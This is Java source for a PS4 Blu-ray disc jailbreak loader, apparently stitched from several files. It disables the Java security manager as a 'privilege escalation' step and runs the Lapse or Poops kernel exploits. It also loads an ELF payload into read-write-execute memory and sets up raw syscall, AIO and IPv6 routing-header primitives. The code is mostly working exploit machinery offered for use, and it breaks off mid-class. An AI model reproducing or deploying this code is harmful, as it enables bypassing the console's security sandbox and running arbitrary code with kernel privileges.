
public class InitXlet implements Xlet, UserEventListener
{
    public static final int BUTTON_X = 10;
    public static final int BUTTON_O = 19;
    public static final int BUTTON_U = 38;
    public static final int BUTTON_D = 40;
    private static InitXlet instance;
    public static class EventQueue
    {
        private LinkedList l;
        int cnt = 0;
        EventQueue()
        {
            l = new LinkedList();
        }
        public synchronized void put(Object obj)
        {
            l.addLast(obj);
            cnt++;
        }
        public synchronized Object get()
        {
            if(cnt == 0)
                return null;
            Object o = l.getFirst();
            l.removeFirst();
            cnt--;
            return o;
        }
    }
    private EventQueue eq;
    private HScene scene;
    private Screen gui;
    private XletContext context;
    private static PrintStream console;
    private static final ArrayList messages = new ArrayList();
    public void initXlet(XletContext context)
    {
        // Privilege escalation
        try {
            DisableSecurityManagerAction.execute();
        } catch (Exception e) {}

        instance = this;
        this.context = context;
        this.eq = new EventQueue();
        scene = HSceneFactory.getInstance().getDefaultHScene();
        try
        {
            gui = new Screen(messages);
            gui.setSize(1920, 1080); // BD screen size
            scene.add(gui, BorderLayout.CENTER);
            UserEventRepository repo = new UserEventRepository("input");
            repo.addKey(BUTTON_X);
            repo.addKey(BUTTON_O);
            repo.addKey(BUTTON_U);
            repo.addKey(BUTTON_D);
            EventManager.getInstance().addUserEventListener(this, repo);
            (new Thread()
            {
                public void run()
                {
                    try
                    {
                        scene.repaint();
                        console = new PrintStream(new MessagesOutputStream(messages, scene));
                        //InputStream is = getClass().getResourceAsStream("/program.data.bin");
                        //CRunTime.init(is);

                        console.println("Hen Loader LP v1.0, based on:");
                        console.println("- GoldHEN 2.4b18.7 by SiSTR0");
                        console.println("- poops code by theflow0");
                        console.println("- lapse code by Gezine");
                        console.println("- BDJ build environment by kimariin");
                        console.println("- java console by sleirsgoevy");
                        console.println("");
                        System.gc(); // this workaround somehow makes Call API working
                        if (System.getSecurityManager() != null) {
                            console.println("Priviledge escalation failure, unsupported firmware?");
                        } else {
                            Kernel.initializeKernelOffsets();
                            String fw = Helper.getCurrentFirmwareVersion();
                            console.println("Firmware: " + fw);
                            if (!KernelOffset.hasPS4Offsets())
                            {
                                console.println("Unsupported Firmware");
                            } else {
                                while (true)
                                {
                                    int lapseFailCount = 0, c = 0;
                                    boolean lapseSupported = (!fw.equals("12.50") && !fw.equals("12.52"));
                                    console.println("\nSelect the mode to run:");
                                    if (lapseSupported) {
                                        console.println("* X = Lapse");
                                        console.println("* O = Poops");
                                    } else {
                                        console.println("* X = Poops");
                                    }
                                    console.println("(Auto-selecting in 1 second...)");

                                    long startTime = System.currentTimeMillis();
                                    long timeout = 1000; // 1 second
                                    boolean autoSelected = false;

                                    while ((c != BUTTON_O || !lapseSupported) && c != BUTTON_X)
                                    {
                                        c = pollInput();
                                        long currentTime = System.currentTimeMillis();
                                        if (currentTime - startTime >= timeout && c == 0)
                                        {
                                            c = BUTTON_X;
                                            autoSelected = true;
                                            break;
                                        }
                                        if (c == 0) {
                                            try {
                                                Thread.sleep(10); // Small sleep to avoid busy waiting
                                            } catch (InterruptedException e) {
                                                break;
                                            }
                                        }
                                    }

                                    if (autoSelected) {
                                        if (lapseSupported) {
                                            console.println("Auto-selected: Lapse");
                                        } else {
                                            console.println("Auto-selected: Poops");
                                        }
                                    }

                                    if (c == BUTTON_X && lapseSupported)
                                    {
                                        int result = org.bdj.external.Lapse.main(console);
                                        if (result == 0)
                                        {
                                            console.println("Success");
                                            break;
                                        }
                                        if (result <= -6 || lapseFailCount++ >= 3)
                                        {
                                            console.println("Fatal fail(" + result + "), please REBOOT PS4");
                                            break;
                                        } else {
                                            console.println("Failed (" + result + "), but you can try again");
                                        }
                                    } else {
                                        int result = org.bdj.external.Poops.main(console);
                                        if (result == 0)
                                        {
                                            console.println("Success");
                                            break;
                                        } else {
                                            console.println("Fatal fail(" + result + "), please REBOOT PS4");
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                    catch(Throwable e)
                    {
                        scene.repaint();
                    }
                }
            }).start();
        }
        catch(Throwable e)
        {
            printStackTrace(e);
        }
        scene.validate();
    }
    public void startXlet()
    {
        gui.setVisible(true);
        scene.setVisible(true);
        gui.requestFocus();
    }
    public void pauseXlet()
    {
        gui.setVisible(false);
    }
    public void destroyXlet(boolean unconditional)
    {
        scene.remove(gui);
        scene = null;
    }
    private void printStackTrace(Throwable e)
    {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        e.printStackTrace(pw);
        if (console != null)
            console.print(sw.toString());
    }
    public void userEventReceived(UserEvent evt)
    {
        boolean ret = false;
        if(evt.getType() == HRcEvent.KEY_PRESSED)
        {
            ret = true;
            if(evt.getCode() == BUTTON_U)
                gui.top += 270;
            else if(evt.getCode() == BUTTON_D)
                gui.top -= 270;
            else
                ret = false;
            scene.repaint();
        }
        if(ret)
            return;
        if(evt.getType() == HRcEvent.KEY_PRESSED)
            eq.put(new Integer(evt.getCode()));
    }
    public static void repaint()
    {
        instance.scene.repaint();
    }
    public static int pollInput()
    {
        Object ans = instance.eq.get();
        if(ans == null)
            return 0;
        return ((Integer)ans).intValue();
    }
import java.security.AccessController;
import java.security.PrivilegedActionException;
import java.security.PrivilegedExceptionAction;

public class DisableSecurityManagerAction implements PrivilegedExceptionAction {
  private DisableSecurityManagerAction() {
  }

  public Object run() {
    System.setSecurityManager(null);
    return System.getSecurityManager();
  }

  public static SecurityManager execute() throws PrivilegedActionException {
        return (SecurityManager) AccessController.doPrivileged(new DisableSecurityManagerAction());
  }
}

}
public class BinLoader {
    // Memory mapping constants
    private static final int PROT_READ = 0x1;
    private static final int PROT_WRITE = 0x2;
    private static final int PROT_EXEC = 0x4;
    private static final int MAP_PRIVATE = 0x2;
    private static final int MAP_ANONYMOUS = 0x1000;
    
    // ELF constants
    private static final int ELF_MAGIC = 0x464c457f; // 0x7F 'E' 'L' 'F' in little endian
    private static final int PT_LOAD = 1;
    private static final int PAGE_SIZE = 0x1000;
    private static final int MAX_PAYLOAD_SIZE = 4 * 1024 * 1024; // 4MB
    
    private static final int READ_CHUNK_SIZE = 4096;
    
    private static final String USBPAYLOAD_RESOURCE = "/disc/BDMV/AUXDATA/aiofix_USBpayload.elf";
    
    private static API api;
    private static byte[] binData;
    private static long mmapBase;
    private static long mmapSize;
    private static long entryPoint;
    private static Thread payloadThread;

    static {
        try {
            api = API.getInstance();
        } catch (Exception e) {
            throw new ExceptionInInitializerError(e);
        }
    }

    public static void start() {
        Thread startThread = new Thread(new Runnable() {
            public void run() {
                startInternal();
            }
        });
        startThread.setName("BinLoader");
        startThread.start();
    }
    
    private static void startInternal() {
        executeEmbeddedPayload();
    }
    
    private static void executeEmbeddedPayload() {
        try {
            File payload = new File(USBPAYLOAD_RESOURCE);
            FileInputStream fi = new FileInputStream(payload);
            byte[] bytes = new byte[fi.available()];
            fi.read(bytes);
            fi.close();
            loadFromData(bytes);
            run();
            waitForPayloadToExit();

        } catch (Exception e) {

        }
    }
    
    private static byte[] loadResourcePayload(String resourcePath) throws Exception {
        InputStream inputStream = BinLoader.class.getResourceAsStream(resourcePath);
        if (inputStream == null) {
            throw new RuntimeException("Resource not found: " + resourcePath);
        }
        
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        byte[] buffer = new byte[READ_CHUNK_SIZE];
        int bytesRead;
        int totalRead = 0;
        
        try {
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
                totalRead += bytesRead;
                
                // Safety check to prevent excessive resource loading
                if (totalRead > MAX_PAYLOAD_SIZE) {
                    throw new RuntimeException("Resource payload exceeds maximum size: " + MAX_PAYLOAD_SIZE);
                }
            }
            
            return outputStream.toByteArray();
            
        } finally {
            inputStream.close();
            outputStream.close();
        }
    }
    
    public static void loadFromData(byte[] data) throws Exception {
        if (data == null) {
            throw new IllegalArgumentException("Payload data cannot be null");
        }
        
        if (data.length == 0) {
            throw new IllegalArgumentException("Payload data cannot be empty");
        }
        
        if (data.length > MAX_PAYLOAD_SIZE) {
            throw new IllegalArgumentException("Payload too large: " + data.length + " bytes (max: " + MAX_PAYLOAD_SIZE + ")");
        }
        
        binData = data;
        
        // Round up to page boundary with overflow check
        long mmapSizeCalc;
        try {
            mmapSizeCalc = roundUp(data.length, PAGE_SIZE);
            if (mmapSizeCalc <= 0 || mmapSizeCalc > MAX_PAYLOAD_SIZE * 2) {
                throw new RuntimeException("Invalid mmap size calculation: " + mmapSizeCalc);
            }
        } catch (ArithmeticException e) {
            throw new RuntimeException("Integer overflow in mmap size calculation");
        }
        
        // Allocate executable memory
        int protFlags = PROT_READ | PROT_WRITE | PROT_EXEC;
        int mapFlags = MAP_PRIVATE | MAP_ANONYMOUS;
        
        long ret = Helper.syscall(Helper.SYS_MMAP, 0L, mmapSizeCalc, (long)protFlags, (long)mapFlags, -1L, 0L);
        if (ret < 0) {
            int errno = api.errno();
            throw new RuntimeException("mmap() failed with error: " + ret + " (errno: " + errno + ")");
        }
        
        // Validate mmap returned a reasonable address
        if (ret == 0 || ret == -1) {
            throw new RuntimeException("mmap() returned invalid address: 0x" + Long.toHexString(ret));
        }
        
        mmapBase = ret;
        mmapSize = mmapSizeCalc;
        
        
        try {
            // Check if ELF by reading magic bytes
            if (data.length >= 4) {
                int magic = ((data[3] & 0xFF) << 24) | ((data[2] & 0xFF) << 16) | 
                           ((data[1] & 0xFF) << 8) | (data[0] & 0xFF);
                
                if (magic == ELF_MAGIC) {
                    entryPoint = loadElfSegments(data);
                } else {
                    // Copy raw data to allocated memory with bounds checking
                    if (data.length > mmapSize) {
                        throw new RuntimeException("Payload size exceeds allocated memory");
                    }
                    api.memcpy(mmapBase, data, data.length);
                    entryPoint = mmapBase;
                }
            } else {
                throw new RuntimeException("Payload too small (< 4 bytes)");
            }
            
            // Validate entry point
            if (entryPoint == 0) {
                throw new RuntimeException("Invalid entry point: 0x0");
            }
            if (entryPoint < mmapBase || entryPoint >= mmapBase + mmapSize) {
                throw new RuntimeException("Entry point outside allocated memory range: 0x" + Long.toHexString(entryPoint));
            }
            
            
        } catch (Exception e) {
            // Cleanup on failure
            long munmapResult = Helper.syscall(Helper.SYS_MUNMAP, mmapBase, mmapSize);
            if (munmapResult < 0) {
            }
            mmapBase = 0;
            mmapSize = 0;
            entryPoint = 0;
            throw e;
        }
    }
    
    private static long loadElfSegments(byte[] data) throws Exception {
        // Create temporary buffer for ELF parsing to avoid header corruption
        long tempBuf = Helper.syscall(Helper.SYS_MMAP, 0L, (long)data.length,
                                      (long)(PROT_READ | PROT_WRITE), (long)(MAP_PRIVATE | MAP_ANONYMOUS), -1L, 0L);
        if (tempBuf < 0) {
            throw new RuntimeException("Failed to allocate temp buffer for ELF parsing");
        }
        
        try {
            // Copy data to temp buffer for parsing
            api.memcpy(tempBuf, data, data.length);
            
            // Read ELF header from temp buffer
            ElfHeader elfHeader = readElfHeader(tempBuf);
            
            // Load program segments directly to final locations
            for (int i = 0; i < elfHeader.phNum; i++) {
                long phdrAddr = tempBuf + elfHeader.phOff + (i * elfHeader.phEntSize);
                ProgramHeader phdr = readProgramHeader(phdrAddr);
                
                if (phdr.type == PT_LOAD && phdr.memSize > 0) {
                    // Calculate segment address (use relative offset)
                    long segAddr = mmapBase + (phdr.vAddr % 0x1000000);
                    
                    // Copy segment data from original data array
                    if (phdr.fileSize > 0) {
                        byte[] segmentData = new byte[(int)phdr.fileSize];
                        System.arraycopy(data, (int)phdr.offset, segmentData, 0, (int)phdr.fileSize);
                        api.memcpy(segAddr, segmentData, segmentData.length);
                    }
                    
                    // Zero out BSS section
                    if (phdr.memSize > phdr.fileSize) {
                        api.memset(segAddr + phdr.fileSize, 0, phdr.memSize - phdr.fileSize);
                    }
                }
            }
            
            return mmapBase + (elfHeader.entry % 0x1000000);
            
        } finally {
            // Clean up temp buffer
            Helper.syscall(Helper.SYS_MUNMAP, tempBuf, (long)data.length);
        }
    }
    
    public static void run() throws Exception {
        // Create Java thread to execute the payload
        payloadThread = new Thread(new Runnable() {
            public void run() {
                try {
                    // Call the entry point function
                    long result = api.call(entryPoint);
                    
                } catch (Exception e) {
                }
            }
        });
        
        payloadThread.setName("BinPayload");
        payloadThread.start();
        
    }
    
    public static void waitForPayloadToExit() throws Exception {
        if (payloadThread != null) {
            try {
                payloadThread.join(); // Wait for thread to finish
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt(); // Restore interrupt status
            }
        }
        
        // Cleanup allocated memory with validation
        if (mmapBase != 0 && mmapSize > 0) {

            try {
                long ret = Helper.syscall(Helper.SYS_MUNMAP, mmapBase, mmapSize);
                if (ret < 0) {
                    int errno = api.errno();
                } else {
                }
            } catch (Exception e) {
            }
            
            // Clear variables to prevent reuse
            mmapBase = 0;
            mmapSize = 0;
            entryPoint = 0;
            binData = null;
        } else {
            
        }
        
        // Clear thread reference
        payloadThread = null;
        
    }
    
    private static class ElfHeader {
        long entry;
        long phOff;
        int phEntSize;
        int phNum;
    }
    
    private static class ProgramHeader {
        int type;
        long offset;
        long vAddr;
        long fileSize;
        long memSize;
    }
    
    private static ElfHeader readElfHeader(long addr) {
        ElfHeader header = new ElfHeader();
        header.entry = api.read64(addr + 0x18);
        header.phOff = api.read64(addr + 0x20);
        header.phEntSize = api.read16(addr + 0x36) & 0xFFFF;
        header.phNum = api.read16(addr + 0x38) & 0xFFFF;
        return header;
    }
    
    private static ProgramHeader readProgramHeader(long addr) {
        ProgramHeader phdr = new ProgramHeader();
        phdr.type = api.read32(addr + 0x00);
        phdr.offset = api.read64(addr + 0x08);
        phdr.vAddr = api.read64(addr + 0x10);
        phdr.fileSize = api.read64(addr + 0x20);
        phdr.memSize = api.read64(addr + 0x28);
        return phdr;
    }
    
    private static long roundUp(long value, long boundary) {
        if (value < 0 || boundary <= 0) {
            throw new IllegalArgumentException("Invalid arguments: value=" + value + ", boundary=" + boundary);
        }
        
        // Check for potential overflow
        if (value > Long.MAX_VALUE - boundary) {
            throw new ArithmeticException("Integer overflow in roundUp calculation");
        }
        
        return ((value + boundary - 1) / boundary) * boundary;
    }
}
public class Helper {
    // Constants
    public static final int AF_INET = 2;
    public static final int AF_INET6 = 28;
    public static final int AF_UNIX = 1;
    public static final int SOCK_DGRAM = 2;
    public static final int SOCK_STREAM = 1;
    public static final int IPPROTO_UDP = 17;
    public static final int IPPROTO_TCP = 6;
    public static final int IPPROTO_IPV6 = 41;
    public static final int SOL_SOCKET = 0xffff;
    public static final int SO_REUSEADDR = 4;
    public static final int SO_LINGER = 0x80;
    public static final int TCP_INFO = 0x20;
    public static final int TCPS_ESTABLISHED = 4;

    // IPv6 Constants
    public static final int IPV6_RTHDR = 51;
    public static final int IPV6_TCLASS = 61;
    public static final int IPV6_2292PKTOPTIONS = 25;
    public static final int IPV6_PKTINFO = 46;
    public static final int IPV6_NEXTHOP = 48;

    // AIO Constants
    public static final int AIO_CMD_READ = 1;
    public static final int AIO_CMD_WRITE = 2;
    public static final int AIO_CMD_FLAG_MULTI = 0x1000;
    public static final int AIO_CMD_MULTI_READ = AIO_CMD_FLAG_MULTI | AIO_CMD_READ;
    public static final int AIO_CMD_MULTI_WRITE = AIO_CMD_FLAG_MULTI | AIO_CMD_WRITE;
    public static final int AIO_STATE_COMPLETE = 3;
    public static final int AIO_STATE_ABORTED = 4;
    public static final int AIO_PRIORITY_HIGH = 3;
    public static final int SCE_KERNEL_ERROR_ESRCH = 0x80020003;
    public static final int MAX_AIO_IDS = 0x80;

    // CPU and Threading Constants
    public static final int CPU_LEVEL_WHICH = 3;
    public static final int CPU_WHICH_TID = 1;
    public static final int RTP_SET = 1;
    public static final int RTP_PRIO_REALTIME = 2;

    // Syscall Numbers
    public static final int SYS_READ = 0x3;
    public static final int SYS_WRITE = 0x4;
    public static final int SYS_OPEN = 0x5;
    public static final int SYS_CLOSE = 0x6;
    public static final int SYS_GETPID = 0x14;
    public static final int SYS_GETUID = 0x18;
    public static final int SYS_ACCEPT = 0x1e;
    public static final int SYS_PIPE = 0x2a;
    public static final int SYS_MPROTECT = 0x4a;
    public static final int SYS_SOCKET = 0x61;
    public static final int SYS_CONNECT = 0x62;
    public static final int SYS_BIND = 0x68;
    public static final int SYS_SETSOCKOPT = 0x69;
    public static final int SYS_LISTEN = 0x6a;
    public static final int SYS_GETSOCKOPT = 0x76;
    public static final int SYS_NETGETIFLIST = 0x7d;
    public static final int SYS_SOCKETPAIR = 0x87;
    public static final int SYS_SYSCTL = 0xca;
    public static final int SYS_NANOSLEEP = 0xf0;
    public static final int SYS_SIGACTION = 0x1a0;
    public static final int SYS_THR_SELF = 0x1b0;
    public static final int SYS_CPUSET_GETAFFINITY = 0x1e7;
    public static final int SYS_CPUSET_SETAFFINITY = 0x1e8;
    public static final int SYS_RTPRIO_THREAD = 0x1d2;
    public static final int SYS_EVF_CREATE = 0x21a;
    public static final int SYS_EVF_DELETE = 0x21b;
    public static final int SYS_EVF_SET = 0x220;
    public static final int SYS_EVF_CLEAR = 0x221;
    public static final int SYS_IS_IN_SANDBOX = 0x249;
    public static final int SYS_DLSYM = 0x24f;
    public static final int SYS_DYNLIB_LOAD_PRX = 0x252;
    public static final int SYS_DYNLIB_UNLOAD_PRX = 0x253;
    public static final int SYS_AIO_MULTI_DELETE = 0x296;
    public static final int SYS_AIO_MULTI_WAIT = 0x297;
    public static final int SYS_AIO_MULTI_POLL = 0x298;
    public static final int SYS_AIO_MULTI_CANCEL = 0x29a;
    public static final int SYS_AIO_SUBMIT_CMD = 0x29d;

    public static final int SYS_MUNMAP = 0x49;
    public static final int SYS_MMAP = 477;
    public static final int SYS_JITSHM_CREATE = 0x215;
    public static final int SYS_JITSHM_ALIAS = 0x216;
    public static final int SYS_KEXEC = 0x295;
    public static final int SYS_SETUID = 0x17;

    public static API api;
    private static long libkernelBase;
    private static long[] syscallWrappers;
    public static Buffer AIO_ERRORS;
    private static String firmwareVersion;

    static {
        try {
            api = API.getInstance();
            syscallWrappers = new long[0x400];
            AIO_ERRORS = new Buffer(4 * MAX_AIO_IDS);
            initSyscalls();
            detectFirmwareVersion();
        } catch (Exception e) {
            throw new ExceptionInInitializerError(e);
        }
    }

    public static long getLibkernelBase() {
        return libkernelBase;
    }

    private static void initSyscalls() throws Exception {
        collectInfo();
        findSyscallWrappers();

        int[] requiredSyscalls = {
            SYS_AIO_SUBMIT_CMD, SYS_AIO_MULTI_DELETE, SYS_AIO_MULTI_WAIT,
            SYS_AIO_MULTI_POLL, SYS_AIO_MULTI_CANCEL, SYS_SOCKET,
            SYS_BIND, SYS_LISTEN, SYS_CONNECT, SYS_ACCEPT,
            SYS_SETSOCKOPT, SYS_GETSOCKOPT, SYS_SOCKETPAIR,
            SYS_READ, SYS_WRITE, SYS_CLOSE, SYS_OPEN,
            SYS_EVF_CREATE, SYS_EVF_DELETE, SYS_EVF_SET, SYS_EVF_CLEAR,
            SYS_GETPID, SYS_GETUID, SYS_SYSCTL, SYS_IS_IN_SANDBOX,
            SYS_CPUSET_GETAFFINITY, SYS_CPUSET_SETAFFINITY, SYS_RTPRIO_THREAD,
            SYS_MUNMAP, SYS_MMAP, SYS_JITSHM_CREATE, SYS_JITSHM_ALIAS, SYS_KEXEC, SYS_SETUID
        };

        boolean allFound = true;
        for (int i = 0; i < requiredSyscalls.length; i++) {
            int syscall = requiredSyscalls[i];
            if (syscallWrappers[syscall] == 0) {
                allFound = false;
            }
        }

        if (!allFound) {
            throw new RuntimeException("Required syscalls not found");
        }
    }

    private static void detectFirmwareVersion() {
        firmwareVersion = sysctlByName("kern.sdk_version");
    }

    public static String getCurrentFirmwareVersion() {
        return firmwareVersion;
    }

    private static String sysctlByName(String name) {
        Buffer translateNameMib = new Buffer(8);
        Buffer mib = new Buffer(0x70);
        Buffer size = new Buffer(8);
        Buffer resultBuf = new Buffer(8);
        Buffer resultSize = new Buffer(8);
        
        // Setup translate name mib
        translateNameMib.putLong(0, 0x300000000L);
        size.putLong(0, 0x70);
        
        // Convert string name to byte array with null terminator
        byte[] nameBytes = new byte[name.length() + 1];
        for (int i = 0; i < name.length(); i++) {
            nameBytes[i] = (byte)name.charAt(i);
        }
        nameBytes[name.length()] = 0;
        Buffer nameBuffer = new Buffer(nameBytes.length);
        nameBuffer.put(0, nameBytes);
        
        // Translate name to mib
        long result = syscall(SYS_SYSCTL, translateNameMib.address(), 2L, 
                             mib.address(), size.address(), 
                             nameBuffer.address(), (long)nameBytes.length);
        if (result < 0) {
            throw new RuntimeException("Failed to translate sysctl name to mib: " + name);
        }
        
        // Get the actual value
        resultSize.putLong(0, 8);
        result = syscall(SYS_SYSCTL, mib.address(), 2L, 
                        resultBuf.address(), resultSize.address(), 0L, 0L);
        if (result < 0) {
            throw new RuntimeException("Failed to get sysctl value for: " + name);
        }
        
        int majorByte = resultBuf.getByte(3) & 0xFF;  // Second byte of version data
        int minorByte = resultBuf.getByte(2) & 0xFF;  // First byte of version data
        
        String majorHex = Integer.toHexString(majorByte);
        String minorHex = Integer.toHexString(minorByte);
        if (minorHex.length() == 1) {
            minorHex = "0" + minorHex;
        }
        return majorHex + "." + minorHex;
    }

    public static boolean isJailbroken() {
        try {
            long setuidResult = syscall(SYS_SETUID, 0L);
            if (setuidResult == 0) {
                return true;
            } else {
                return false;
            }
        } catch (Exception e) {
            return false;
        }
    }

    private static void collectInfo() throws Exception {
        final int SEGMENTS_OFFSET = 0x160;
        long sceKernelGetModuleInfoFromAddr = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "sceKernelGetModuleInfoFromAddr");
        if (sceKernelGetModuleInfoFromAddr == 0) {
            throw new RuntimeException("sceKernelGetModuleInfoFromAddr not found");
        }

        long addrInsideLibkernel = sceKernelGetModuleInfoFromAddr;
        Buffer modInfo = new Buffer(0x300);

        long ret = api.call(sceKernelGetModuleInfoFromAddr, addrInsideLibkernel, 1, modInfo.address());
        if (ret != 0) {
            throw new RuntimeException("sceKernelGetModuleInfoFromAddr() error: 0x" + Long.toHexString(ret));
        }

        libkernelBase = api.read64(modInfo.address() + SEGMENTS_OFFSET);
    }

    private static void findSyscallWrappers() {
        final int TEXT_SIZE = 0x40000;
        byte[] libkernelText = new byte[TEXT_SIZE];
        for (int i = 0; i < TEXT_SIZE; i++) {
            libkernelText[i] = api.read8(libkernelBase + i);
        }

        for (int i = 0; i <= TEXT_SIZE - 12; i++) {
            if (libkernelText[i] == 0x48 &&
            libkernelText[i + 1] == (byte)0xc7 &&
            libkernelText[i + 2] == (byte)0xc0 &&
            libkernelText[i + 7] == 0x49 &&
            libkernelText[i + 8] == (byte)0x89 &&
            libkernelText[i + 9] == (byte)0xca &&
            libkernelText[i + 10] == 0x0f &&
            libkernelText[i + 11] == 0x05) {

                int syscallNum = (libkernelText[i + 3] & 0xFF) |
                ((libkernelText[i + 4] & 0xFF) << 8) |
                ((libkernelText[i + 5] & 0xFF) << 16) |
                ((libkernelText[i + 6] & 0xFF) << 24);

                if (syscallNum >= 0 && syscallNum < syscallWrappers.length) {
                    syscallWrappers[syscallNum] = libkernelBase + i;
                }
            }
        }
    }

    // Syscall wrappers
    public static long syscall(int number, long arg0, long arg1, long arg2, long arg3, long arg4, long arg5) {
        return api.call(syscallWrappers[number], arg0, arg1, arg2, arg3, arg4, arg5);
    }

    public static long syscall(int number, long arg0, long arg1, long arg2, long arg3, long arg4) {
        return api.call(syscallWrappers[number], arg0, arg1, arg2, arg3, arg4);
    }

    public static long syscall(int number, long arg0, long arg1, long arg2, long arg3) {
        return api.call(syscallWrappers[number], arg0, arg1, arg2, arg3);
    }

    public static long syscall(int number, long arg0, long arg1, long arg2) {
        return api.call(syscallWrappers[number], arg0, arg1, arg2);
    }

    public static long syscall(int number, long arg0, long arg1) {
        return api.call(syscallWrappers[number], arg0, arg1);
    }

    public static long syscall(int number, long arg0) {
        return api.call(syscallWrappers[number], arg0);
    }

    public static long syscall(int number) {
        return api.call(syscallWrappers[number]);
    }

    // Utility functions
    public static short htons(int port) {
        return (short)(((port << 8) | (port >>> 8)) & 0xFFFF);
    }

    public static int aton(String ip) {
        String[] parts = split(ip, "\\.");
        int a = Integer.parseInt(parts[0]);
        int b = Integer.parseInt(parts[1]);
        int c = Integer.parseInt(parts[2]);
        int d = Integer.parseInt(parts[3]);
        return (d << 24) | (c << 16) | (b << 8) | a;
    }

    public static String toHexString(int value, int minWidth) {
        String hex = Integer.toHexString(value);
        StringBuffer sb = new StringBuffer();
        for (int i = hex.length(); i < minWidth; i++) {
            sb.append("0");
        }
        sb.append(hex);
        return sb.toString();
    }

    public static String[] split(String str, String regex) {
        java.util.Vector parts = new java.util.Vector();
        int start = 0;
        int pos = 0;

        while ((pos = str.indexOf(".", start)) != -1) {
            parts.addElement(str.substring(start, pos));
            start = pos + 1;
        }
        parts.addElement(str.substring(start));

        String[] result = new String[parts.size()];
        for (int i = 0; i < parts.size(); i++) {
            result[i] = (String)parts.elementAt(i);
        }
        return result;
    }

    public static int createUdpSocket() {
        long result = syscall(SYS_SOCKET, (long)AF_INET6, (long)SOCK_DGRAM, (long)IPPROTO_UDP);
        if (result == -1) {
            throw new RuntimeException("new_socket() error: " + result);
        }
        return (int)result;
    }

    public static int createTcpSocket() {
        long result = syscall(SYS_SOCKET, (long)AF_INET, (long)SOCK_STREAM, 0L);
        if (result == -1) {
            throw new RuntimeException("new_tcp_socket() error: " + result);
        }
        return (int)result;
    }

    public static void setSockOpt(int sd, int level, int optname, Buffer optval, int optlen) {
        long result = syscall(SYS_SETSOCKOPT, (long)sd, (long)level, (long)optname, optval.address(), (long)optlen);
        if (result == -1) {
            throw new RuntimeException("setsockopt() error: " + result);
        }
    }

    public static int getSockOpt(int sd, int level, int optname, Buffer optval, int optlen) {
        Buffer size = new Buffer(8);
        size.putInt(0, optlen);
        long result = syscall(SYS_GETSOCKOPT, (long)sd, (long)level, (long)optname, optval.address(), size.address());
        if (result == -1) {
            throw new RuntimeException("getsockopt() error: " + result);
        }
        return size.getInt(0);
    }

    public static int getCurrentCore() {
        try {
            Buffer mask = new Buffer(0x10);
            mask.fill((byte)0);

            long result = syscall(SYS_CPUSET_GETAFFINITY, (long)CPU_LEVEL_WHICH, (long)CPU_WHICH_TID, -1L, 0x10L, mask.address());
            if (result != 0) {
                return -1;
            }

            int maskValue = mask.getInt(0);
            int position = 0;
            int num = maskValue;

            while (num > 0) {
                num = num >>> 1;
                position++;
            }

            return Math.max(0, position - 1);
        } catch (Exception e) {
            return -1;
        }
    }

    public static boolean pinToCore(int core) {
        try {
            Buffer mask = new Buffer(0x10);
            mask.fill((byte)0);

            int maskValue = 1 << core;
            mask.putShort(0, (short)maskValue);

            long result = syscall(SYS_CPUSET_SETAFFINITY, (long)CPU_LEVEL_WHICH, (long)CPU_WHICH_TID, -1L, 0x10L, mask.address());
            return result == 0;
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean setRealtimePriority(int priority) {
        try {
            Buffer rtprio = new Buffer(0x4);
            rtprio.putShort(0, (short)RTP_PRIO_REALTIME);
            rtprio.putShort(2, (short)priority);

            long result = syscall(SYS_RTPRIO_THREAD, (long)RTP_SET, 0L, rtprio.address());
            return result == 0;
        } catch (Exception e) {
            return false;
        }
    }

    // AIO operations
    public static Buffer createAioRequests(int numReqs) {
        Buffer reqs1 = new Buffer(0x28 * numReqs);
        for (int i = 0; i < numReqs; i++) {
            reqs1.putInt(i * 0x28 + 0x20, -1); // fd = -1
        }
        return reqs1;
    }

    public static long aioSubmitCmd(int cmd, long reqs, int numReqs, int prio, long ids) {
        return syscall(SYS_AIO_SUBMIT_CMD, (long)cmd, reqs, (long)numReqs, (long)prio, ids);
    }

    public static long aioMultiCancel(long ids, int numIds, long states) {
        return syscall(SYS_AIO_MULTI_CANCEL, ids, (long)numIds, states);
    }

    public static long aioMultiPoll(long ids, int numIds, long states) {
        return syscall(SYS_AIO_MULTI_POLL, ids, (long)numIds, states);
    }

    public static long aioMultiDelete(long ids, int numIds, long states) {
        return syscall(SYS_AIO_MULTI_DELETE, ids, (long)numIds, states);
    }

    public static long aioMultiWait(long ids, int numIds, long states, int mode, long timeout) {
        return syscall(SYS_AIO_MULTI_WAIT, ids, (long)numIds, states, (long)mode, timeout);
    }

    // Bulk AIO operations
    public static void cancelAios(long ids, int numIds) {
        int len = MAX_AIO_IDS;
        int rem = numIds % len;
        int numBatches = (numIds - rem) / len;

        for (int i = 0; i < numBatches; i++) {
            aioMultiCancel(ids + (i * 4 * len), len, AIO_ERRORS.address());
        }

        if (rem > 0) {
            aioMultiCancel(ids + (numBatches * 4 * len), rem, AIO_ERRORS.address());
        }
    }

    public static void freeAios(long ids, int numIds, boolean doCancel) {
        int len = MAX_AIO_IDS;
        int rem = numIds % len;
        int numBatches = (numIds - rem) / len;

        for (int i = 0; i < numBatches; i++) {
            long addr = ids + (i * 4 * len);
            if (doCancel) {
                aioMultiCancel(addr, len, AIO_ERRORS.address());
            }
            aioMultiPoll(addr, len, AIO_ERRORS.address());
            aioMultiDelete(addr, len, AIO_ERRORS.address());
        }

        if (rem > 0) {
            long addr = ids + (numBatches * 4 * len);
            if (doCancel) {
                aioMultiCancel(addr, rem, AIO_ERRORS.address());
            }
            aioMultiPoll(addr, rem, AIO_ERRORS.address());
            aioMultiDelete(addr, rem, AIO_ERRORS.address());
        }
    }

    public static void freeAios(long ids, int numIds) {
        freeAios(ids, numIds, true);
    }

    // IPv6 routing header operations
    public static int buildRoutingHeader(Buffer buf, int size) {
        int len = ((size >>> 3) - 1) & (~1);
        size = (len + 1) << 3;

        buf.putByte(0, (byte)0);             // ip6r_nxt
        buf.putByte(1, (byte)len);           // ip6r_len
        buf.putByte(2, (byte)0);             // ip6r_type
        buf.putByte(3, (byte)(len >>> 1));   // ip6r_segleft

        return size;
    }

